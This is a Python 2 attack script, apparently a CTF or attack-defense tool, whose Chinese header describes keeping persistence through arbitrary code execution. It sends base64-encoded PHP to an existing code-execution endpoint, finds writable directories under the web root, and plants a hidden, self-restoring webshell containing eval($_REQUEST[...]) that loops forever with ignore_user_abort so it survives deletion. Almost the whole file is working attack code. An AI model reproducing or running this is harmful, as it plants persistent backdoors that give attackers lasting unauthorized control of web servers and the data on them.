#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 通过任意代码执行达到权限维持的效果

import requests
import random
import string
import hashlib

def random_string(length):
    result = [random.choice(string.letters) for i in range(length)]
    return "".join(result)

def code_exec(url, code):
    flag = random_string(0x10)
    data = {
        "c":"echo '%s';%s;echo '%s';" % (flag, code, flag)
    }
    response = requests.post(url, data=data)
    content = response.content
    if flag in content:
        return content.split(flag)[1]
    return content

def get_writable_dir(url, root):
    code = "function scan($path){ foreach(scandir($path) as $file){ if($file == '.' || $file == '..'){ continue; } if(is_dir($path.'/'.$file)){ if(is_writable($path.'/'.$file)){ echo $path.'/'.$file.\"\n\"; } scan($path.'/'.$file); } } } scan('" + root + "');"
    payload = "eval(base64_decode('%s'));" % (code.encode("base64").replace("\n", ""))
    return code_exec(url, payload).split("\n")[0:-1]

def write_memery_webshell(url, directory, password):
    sleep_time = 500 # micro second
    code = "<?php $content = '<?php eval($_REQUEST[%s]);?>'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true){ if(file_get_contents($path) != $content){ file_put_contents($path, $content); } usleep(%d); }?>" % (password, directory, password, sleep_time)
    filename = ".%s.php" % (password)
    path = "%s/%s" % (directory, filename)
    payload = "file_put_contents('%s', base64_decode('%s'));" % (path, code.encode("base64").replace("\n", ""))
    print payload
    return
    return code_exec(url, payload).split("\n")[0:-1]

def active_memery_webshell(url):
    try:
        requests.get(url, timeout=0.5)
    except:
        print "[+] OK!"

def get_password(host, port):
    return hashlib.md5(host + ":" + port).hexdigest()

def main():
    host = "127.0.0.1"
    port = "80"
    url = "http://%s:%s/c.php" % (host, port)
    root = "/var/www/html"
    password = get_password(host, port)
    print "[+] Getting writable dirs..."
    writable_dirs = get_writable_dir(url, root)
    print "[+] Writable dirs : "
    print writable_dirs
    for writable_dir in writable_dirs:
        write_memery_webshell(url, writable_dir, password)
        webshell_url = "http://%s:%s/%s/.%s.php" % (host, port, writable_dir.replace(root + "/", ""), password)
        print "[+] Webshell : [%s]" % (webshell_url)
        print "[+] Activing memery webshell..."
        active_memery_webshell(webshell_url)

if __name__ == "__main__":
    print write_memery_webshell("","/var/www/html/uploads/","c")
    # main()
